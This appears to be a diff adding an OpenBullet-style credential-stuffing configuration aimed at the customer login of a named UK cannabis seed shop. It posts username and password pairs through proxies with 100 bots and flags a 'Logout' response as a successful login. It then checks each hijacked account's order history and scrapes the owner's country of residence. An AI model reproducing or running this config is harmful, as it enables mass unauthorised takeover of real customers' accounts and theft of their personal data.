@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "Alibongo Cannabis Seeds",
+  "SuggestedBots": 100,
+  "LastModified": "2018-12-22T19:41:16.9322182+00:00",
+  "AdditionalInfo": "",
+  "Author": "Hyacintho",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login REQUEST POST "https://www.alibongocannabisseeds.co.uk/my-account/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&login=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.alibongocannabisseeds.co.uk" 
+  HEADER "referer: https://www.alibongocannabisseeds.co.uk/my-account/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+  KEYCHAIN Failure OR 
+    KEY "Your entered details are incorrect. Please make sure you have your correct login details." 
+#Orders REQUEST GET "https://www.alibongocannabisseeds.co.uk/my-account/my-orders/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.alibongocannabisseeds.co.uk/my-account/" 
+#Orders KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "You currently have no orders on record." 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" EqualTo "You currently have no orders on record." 
+#Country REQUEST GET "https://www.alibongocannabisseeds.co.uk/my-account/my-profile/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "https: //www.alibongocannabisseeds.co.uk/my-account/" 
+#Country PARSE "<SOURCE>" LR "Country of Residence:</td>" "</td>" Recursive=FALSE -> CAP "Country of Residence:" "" "" 
